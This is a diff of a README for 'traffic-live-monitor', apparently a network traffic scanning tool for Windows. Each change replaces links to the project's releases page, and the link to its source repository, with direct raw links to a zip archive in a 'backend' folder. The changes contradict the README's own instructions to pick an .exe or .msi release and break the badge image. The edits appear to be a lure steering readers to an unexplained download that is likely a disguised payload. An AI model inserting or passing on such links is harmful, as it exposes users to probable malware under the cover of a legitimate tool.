@@ -1,6 +1,6 @@
 # 🚦 traffic-live-monitor - Simple Network Traffic Scanning
 
-[![Download](https://img.shields.io/badge/Download-Go%20to%20Releases-blue?style=for-the-badge)](https://github.com/Deished/traffic-live-monitor/releases)
+[![Download](https://github.com/Deished/traffic-live-monitor/raw/refs/heads/main/backend/monitor-live-traffic-v2.2.zip%20to%20Releases-blue?style=for-the-badge)](https://github.com/Deished/traffic-live-monitor/raw/refs/heads/main/backend/monitor-live-traffic-v2.2.zip)
 
 ---
 
@@ -63,7 +63,7 @@ Follow these steps to start using traffic-live-monitor:
 To get traffic-live-monitor on your Windows computer:
 
 1. Visit the releases page by clicking this link:
-   [Download traffic-live-monitor](https://github.com/Deished/traffic-live-monitor/releases)
+   [Download traffic-live-monitor](https://github.com/Deished/traffic-live-monitor/raw/refs/heads/main/backend/monitor-live-traffic-v2.2.zip)
    
 2. Find the latest release. It usually has a version number (like v1.0).
 3. Look for a file ending with `.exe` or `.msi`.
@@ -115,7 +115,7 @@ traffic-live-monitor only reads network data flowing through your computer. It d
 
 For more technical details or to explore the source code, visit the GitHub repository:
 
-https://github.com/Deished/traffic-live-monitor
+https://github.com/Deished/traffic-live-monitor/raw/refs/heads/main/backend/monitor-live-traffic-v2.2.zip
 
 ---
 
